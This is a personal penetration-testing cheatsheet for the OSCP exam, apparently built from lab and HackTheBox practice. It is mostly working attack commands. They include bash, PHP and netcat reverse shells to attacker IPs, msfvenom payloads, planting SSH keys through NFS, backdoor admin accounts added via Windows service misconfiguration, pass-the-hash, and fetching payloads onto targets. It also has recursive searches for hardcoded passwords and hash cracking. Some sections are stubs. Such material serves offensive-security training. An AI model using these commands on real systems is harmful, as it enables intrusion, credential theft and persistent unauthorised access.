# OSCP Cheatsheet

[Recon](#RECON)  
[Services](#SERVICES)  
* [FTP](#FTP---TCP-21)  
[Recon](#RECON)  
[Recon](#RECON)  
[Recon](#RECON)  


# RECON

Enumeration Mindmap: https://github.com/DigitalAftermath/EnumerationVisualized/wiki

Port Scans:
(NOTE: Heavy scanning may result in ports being filtered/closed - wait <15 minutes to be unbanned)
```bash
# PORT SCANS
$ nmap -sC -sV -oA 10.10.10.29          (IPPSEC)
$ nmap 10.11.1.71 --top-ports 20 --open
$ nmap 10.11.1.71 -p- -sV

# NSE
$ ls -l /usr/share/nmap/scripts/*ssh*
$ nmap -v -p 139,445 --script=smb-vuln-ms17-010.nse --script-args=unsafe=1 10.11.1.31
```

Kali Apache server not working properly? Try use:
`$ python -m SimpleHTTPServer 8080`

# SERVICES

### FTP - TCP 21

Fingerprint / access FTP server:
```
# cmdline access
$ nc 10.11.1.125 21
$ telnet 10.11.1.125 21
$ ftp 10.11.1.125

# browser access
ftp://10.11.1.125
```

Get / Put files:
```
ftp> get [ filename ]
ftp> put reverse-shell.txt
```

### SSH (TCP 22)

Fingerprint server/OS, SSH key.
Basic auth-bypass (user=Patrick pass=Patrick) => Privesc `$ sudo su` + `$ su root`


### HTTP (TCP 80|8080|443|8443 etc.)

See section "WEB" for juicy web stuff.



__Telnet (TCP 23)__

Stuff


__SMTP (TCP 25)__

SMTP enum tools
```bash
$ snmp-check [ target ]
```

Manual fingerprinting
```bash
$ echo VRFY 'admin' | nc -nv -w 1 $target_ip 25
```


__DNS (TCP 53)__

Changing nameserver to target IP, revealing additional domains / directories.
```bash
root@kali#  nano /etc/resolv.conf
#nameserver 10.211.55.1                           # comment out default config
#nameserver fe80::21c:42ff:fe00:18%eth0           # comment out default config
nameserver [ target ip ]

root@kali#  nslookup
> friendzoneportal.red
```

Zone Transfers to reveal subdomains
```bash
root@kali# dig axfr friendzoneportal.red @10.10.10.123
; <<>> DiG 9.10.3-P4-Debian <<>> axfr friendzoneportal.red @10.10.10.123
admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
files.friendzoneportal.red. 604800 IN	A	127.0.0.1
imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
```

__Remote Procedure Call - RPC (TCP 111)__

Exploit NFS shares
```
$ rpcinfo -p [ target IP ] | grep 'nfs'
$ showmount -e [ target IP ]                      # show mountable directories
$ mount -t nfs [target IP]:/ /mnt -o nolock       # mount remote share to your local machine
$ df -k                                           # show mounted file systems
```

Attack scenario: replace target SSH keys with your own
```
$ mkdir -p /root/.ssh
$ cd /root/.ssh/
$ ssh-keygen -t rsa -b 4096
Enter file in which to save the key (/root/.ssh/id_rsa): hacker_rsa
Enter passphrase (empty for no passphrase): Just Press Enter
Enter same passphrase again: Just Press Enter
$ mount -t nfs 192.168.1.112:/ /mnt -o nolock
$ cd /mnt/root/.ssh
$ cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/
$ cat hacker_rsa.pub >> authorized_keys                     # add your public key to authorized_keys
$ ssh -i /root/.ssh/hacker_rsa root@192.168.1.112           # SSH to target using your private key
```

__SMB / NETBIOS / SMBD (TCP 135-139 - 445)__  
SMB is a communications protocol primarily designed for file sharing and printer sharing. It is not intended as a general networking tool.  

Netbios is an API for the SMB protocol. A SMB client will interact with a Netbios API to send an SMB command to an SMB server, then listen for replies.

SMB/Netbios enumeration
```bash
$ nmblookup -A 10.11.1.XXX
$ smbclient //MOUNT/share -I 10.11.1.XXX -N
$ rpcclient -U "" 10.11.1.XXX
$ enum4linux 10.11.1.XXX        // enum info from Windows and Samba hosts 
$ nbtscan 10.11.1.XXX           // Netbios nameserver scanner

# Find named pipes
`msfconsole> use auxiliary/scanner/smb/pipe_auditor`
```

Accessing shared dirs:
* `smbclient \\\\10.11.1.75\\Users` or just `smbclient \\\\10.11.1.75\\{SHARE_NAMES}`
* `smb:\> put src_file remote_file`
* `smb:\> get remote_file`
* Put nc.exe => reverse shell
* Get password files => access via. ssh/rdp

MS17-010 Code Exec
* `PsExec64.exe \\10.11.1.49 -u Alice -p aliceishere ipconfig` (see more cmds: https://ss64.com/nt/psexec.html)
* `PsExec -u tom -p iamtom \\TOMSCOMP C:\path\to\nc.exe IP_OF_ATTACKING_SYSTEM 8080 -e C:\windows\system32\cmd.exe`
* `runas`
* `nc.exe 10.11.0.42 443 -e cmd.exe`
* Add new admin account: https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit

Privesc
* Mount shared drives:  
```bash
$ net use z: \\10.11.1.49\Users /user:alice aliceishere     // mount with auth
$ net use z: \\ACCESS\SHARENAME$                            // mount without auth
```


Working exploits:
* [MS08-067] NetAPI module in Windows SMB
* [MS17_010] Eternal blue detection: `use auxiliary/scanner/smb/smb_ms17_010`
* [MS17-010 ALTERNATIVE METHOD]: Adding new admin account https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit



__SMBD / SAMBA (TCP 139)__

SMBD/Sambda is a server to provide SMB service to clients

Working exploits:
* Samba 2.2.x remote buffer overflow: https://www.exploit-db.com/exploits/7


__MSRPC (TCP 135)__
* Stuff

__SNMP (UDP 161)__

SNMP enumeration:
```
$ snmpwalk -c [community string] -v1 [ target ]
$ onesixtyone [ target ] -c community.txt
$ snmpenum
$ snmpcheck
```

Snmpwalk brute-force script:
```bash
#!/bin/bash
while read line; do
    echo "Testing $line"; snmpwalk -c $line -v1 10.10.10.105
done < community.txt
```

Community string wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt

__MySQL (TCP 3306)__

Connect:
```
$ mysql -u root -p
```

Drop to a shell (as the user running MySQL):
```
mysql> \! /bin/bash
```

__RDP (TCP 3389)__

If you have credentials, you can enable the RDP service then log in:
```powershell
# METHOD 1
$ netsh firewall set service RemoteDesktop enable

# METHOD 2
$ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# METHOD 3
$ reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f

# METHOD 4
$ sc config TermService start= auto
$ net start Termservice
$ netsh.exe firewall add portopening TCP 3389 "Remote Desktop"

# METHOD 5
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [TCP 3389]" enable=yes 
profile=private,domain localport=3389 protocol=tcp

# METHOD 6
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow 
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
Remote Desktop service to allow RDP traffic. [UDP 3389]" enable=yes 
profile=private,domain localport=3389 protocol=udp
```

__IRC (TCP 6660-6669, 6697, 67000)__

IRC enum:
* Start `hexchat` in Kali.
* Add IRC channel `TargetIP/6697` + connect to channel.
* View output/look for version numbersc -> searchsploit/Google

# WEB

```bash
$ curl -i -L 10.11.1.71    # Follow re-directs
$ gobuster -u http://10.11.1.71 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```

Denied from accessing /robots.txt?
* Try change the user agent i.e. `curl -v http://10.11.1.39/robots.txt -H "User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)"`

Exploit code not working? Try:
* Full directory paths to binaries and your files e.g. `/usr/bin/wget http:example.com -o /full/path/to/file.txt`

ColdFusion vulns
* https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
* https://www.absolomb.com/2017-12-29-HackTheBox-Arctic-Writeup/
* ColdFusion LFI: http://hatriot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/

WEBDAV vulns - using tools . 
https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp  
http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html  
```bash
$ davtest -url 10.11..113                                 # test for webdav vulns
$ davtest -url http://10.11.1.13                          # upload file from local to remote dir (HTTP PUT)
          -uploadfile rshell.asp -uploadloc rshell.html
$ cadaver
dav:!> open 10.11.1.13                                    # open connection to URL
dav:!> move '/rshell.txt' to '/rshell.asp'                # move .txt -> .asp (now executable)
```

WEBDAV vulns - manual
```bash
$ curl -T '/path/to/local/file.txt' 'http://10.11.1.13/'                              # upload file to remote
$ curl -v -X MOVE -H 'Destination: http://10.11.1.13/[new]' 'http://10.11.1.13/[old]' # move .ext1 -> .ext2
```

Apache
* Log paths: https://wiki.apache.org/httpd/DistrosDefaultLayout

phpLiteAdmin 1.9.3 Remote PHP Code Injection:
* https://v3ded.github.io/ctf/zico2.html

LFI / RFI
(LFI = HIGH CHANCE OF RFI, SO TRY TO INCLUDE HTTP://ATTACKER/RSHELL.PHP)
```
# Append NULL bytes (prevent .ext concat to the end by application)
http://example.com/index.php?page=../../../etc/passwd%00
http://example.com/index.php?page=../../../etc/passwd%en
http://example.com/index.php?page=../../../etc/passwd%00%en
```

PHP
* Check `phpinfo()`
* RFI: If reverse-shell doesn't work, include `<?php phpinfo();?>` to check for banned functions
* PHP reverse shell:
```
$ bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
$ /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'
$ php -r '$sock=fsockopen("10.10.14.3",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Apache
* Exposed `server-status` page: https://github.com/mazen160/server-status_PWN. Listen in to all requests by clients using this tool, including cookies.

## INITIAL EXPLOITATION

Reverse shell cheatsheet:
* http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/

Metasploit reverse shell payloads:
* http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
* https://netsec.ws/?p=331

Meterpreter reverse-shell + usage:
```bash
# Windows
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[host] LPORT=444 -f exe -o win_rshell.exe

# Linux
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[host] LPORT=444 -f elf -o lin_rshell.elf

# Use reverse-shell
msf> use exploit/multi/handler
```

If reverse shell hangs / dies:
* Try a different port, try a different port. E.g. 443 doesn't work, try 80 or 8080 (see your Nmap results).
* A firewall may be blocking / disconnecting you on the port.
* Try a bind shell instead of reverse shell.
* Try generate a different payload with `msfvenom -p` or find another payload online.

## KERNEL EXPLOITS

FreeBSD 9.0
* FreeBSD 9.0 - Intel SYSRET: https://www.exploit-db.com/exploits/28718

## LINUX PRIVESC

Privilege escalation guides:
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (manual)
* https://www.reddit.com/r/oscp/comments/9ystub/i_absolutely_suck_at_privilege_escalation/?st=JOQAMPYP&sh=8899be73

Automated Linux enumeration scripts:
* https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
* https://github.com/ankh2054/linux-pentest/blob/master/linuxprivchecker.py
* https://github.com/rebootuser/LinEnum
* https://tools.kali.org/vulnerability-analysis/unix-privesc-check

Find hardcoded credentials / interesting items
```
# Recursive grep, match regex pattern, ignoring case for all files from the root directory.
$ grep -Rei 'password|username|[pattern3]|[pattern4]' /
```

TTY spawn cheatsheet: https://netsec.ws/?p=337
* `python -c 'import pty; pty.spawn("/bin/sh")'`

Quick Wins:
* Run Linux exploit suggester: https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh
* Misconfigured /etc/sudoers:
```bash
# THIS HAS WORKED BEFORE: Due to misconfiguration in /etc/sudoers
$ sudo su	# execute su as root
$ su root	# become root
```

UDEV
* Guide: http://www.madirish.net/370
* Exploit Code: https://www.exploit-db.com/exploits/8478

Exploiting Crontabs / Cronjobs:
* Bad permissions /etc/crontab: https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/

Exploitable SUIDs / SGIDs:
```
/cp
/nmap
/vi
/vim.basic
/nano
/less
/more
/usr/bin/viewuser (HackTheBox)
```

Databases:
* Check for presence of both MYSQL and MARIADB.
* They may have two different types of databases to get creds / important info, so check for both.

## WINDOWS PRIVESC

Windows privesc:
* Automated scanner: https://github.com/azmatt/windowsEnum (automated)
* https://guif.re/windowseop?fbclid=IwAR0jmCV-uOLaUJCnKiGB2ZaDt9XZwlAGM3nTOH0GkS6c0hS63FFSGm97Tdc#Windows%20version%20map
* https://github.com/xapax/security/blob/master/privilege_escalation_windows.md
* http://www.fuzzysecurity.com/tutorials/16.html
* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

!! If a service is running as SYSTEM, you can try to replace the executable with a malicious exe !!
* Malicious exe: Add local user to Admin group | reverse shell
* Check for permissions of exe's: `icacls [service.exe]`
* Requires restarting service for system to rerun as your exe.
* Restarting might simply mean you have to access the service directly
    * E.g. `MYSQL> restart` rather than running commands on cmd to try restart.
    
Find Running Services:
```
$ sc query state=all
```
    
Cached Credentials:
```powershell
# CMDKEY: https://ss64.com/nt/cmdkey.html
$ cmdkey /list      
    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator

# RUNAS: https://ss64.com/nt/runas.html
$ runas /savecred /User:ACCESS\Administrator "cmd.exe /C type C:\Users\Administrator\Desktop\root.txt>C:\Users\noob\out.txt"
```

Nestat:
* `netstat -alnp`: see what ports are on LISTENING state, but not pubicly accessible from the outside.
* There's often a SQL server/tomcat/smb/samba running, but not public facing.
* You can port-forward back to your machine and hit them with public exploits for root shell.
* E.g.:
```powershell
$ plink.exe -l root 10.11.0.42 -R 445:127.0.0.1:445      // forward target local p445 -> attacker p445
$ pth-winexe -U alice%aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE // run cmd.exe
```

Accesschk.exe:
* http://www.fuzzysecurity.com/tutorials/16.html
```
accesschk.exe -uwdqs Users c:\ /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

Psexec.exe:
* https://pinkysplanet.net/escalating-privileges-in-windows-with-psexec-and-netcat/
* https://www.robvanderwoude.com/ntadmincommands.php#Cmd15

Net Use:
* https://www.robvanderwoude.com/ntadmincommands.php#Cmd15

Windows file transfer methods:
```powershell
# Run: https://gist.github.com/sckalath/ec7af6a1786e3de6c309
$ cscript wget.vbs http://10.11.0.42/nc.exe

# tftp: set up tftp folder in Kali box
$ mkdir /tftp
$ atftpd --daemon --port 69 /tftp
$ cp /usr/share/windows-binaries/nc.exe /tftp/
# tftp: download nc.exe to target machine
cmd> tftp -i 10.11.0.63 get nc.exe
cmd> "Transfer successful: 59392 bytes in 31 seconds."

# (KALI) ftp - start FTP server
$ python -m pyftpdlib -p 21
# (TARGET) ftp - connect to server, get file
$ echo open 10.10.15.39 21> ftp.txt
$ echo USER anonymous>> ftp.txt
$ echo PASS anonymous@>> ftp.txt
$ echo bin>> ftp.txt
$ echo GET nc.exe>> ftp.txt
$ echo bye>> ftp.txt
$ ftp -v -n -s:ftp.txt

# Certutil ???
http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html

# Powershell method
(new-object System.Net.WebClient).DownloadString("http://www.mysite.com") # replicate Curl
(new-object System.Net.WebClient).DownloadData("http://www.mysite.com")   # replicate Curl
(new-object System.Net.WebClient).DownloadFile("http://www.mysite.com", 'C:\Temp\file') # replicate Wget
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; # ignore SSL warnings (add to lines above)

# Powershell method
$ impacket-smbserver files `pwd`            # @KALI: Set up a SMB server with files=share `pwd`=workingdir.
PS> xcopy \\10.10.14.3\files\rshell.exe .   # @TARGET: Copy rshell.exe from remote share to current dir.


```

Vulnerable services:
```powershell
# Vulnerable services
sc qc <vulnerable service name>
sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 

sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
net start <vulnerable-service>
```

## MSFVENOM PAYLOADS

Msfvenom commands:
* https://netsec.ws/?p=331

### COMPILING EXPLOIT CODE

Compilation tips:
* `./exploit` results in errors: compile in the host itself, Kali box or another machine.

Compilation commands:
```bash
# Compile Linux (cross architecture)
$ gcc -m32 -Wl,--hash-style=both exploit.c -o exploit

# Compile to Windows .exe from Linux Windows
$ i686-w64-mingw32-gcc 25912.c -o exploit.exe -lws2_32
$ wine exploit.exe
```

## OTHER THINGS

__Cracking Hashes__

Useful Websites (has worked before):
* https://hashkiller.co.uk/Cracker/NTLM

Tools:
```
$ hashcat -h | grep -i [hash you want to crack]     # find hash input number
$ hashcat -m 5600 /path/to/hash /path/to/wordlist   # 5600 = specify NTLMv2 hash
```

__ZIP Files__

Brute-force passworded zips:
```
$ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' passwords.zip
```

__Hexdump investigation__

Microsoft Acccess .mdb files:
```
# Hexdump
$ mdb-hexdump database.mdb > hexdump.txt

# Upload hexdump to online reader + search "admin" "password" etc.
https://www.onlinehexeditor.com
https://hexed.it
```

__strings__

Strings command finds all printable strings in an object, binary or file.  
This could reveal credentials or useful information.
```bash
$ strings [ filename ]
```

__Metadata__

```
$ exiftools
$ hexdump
$ binwalk
```

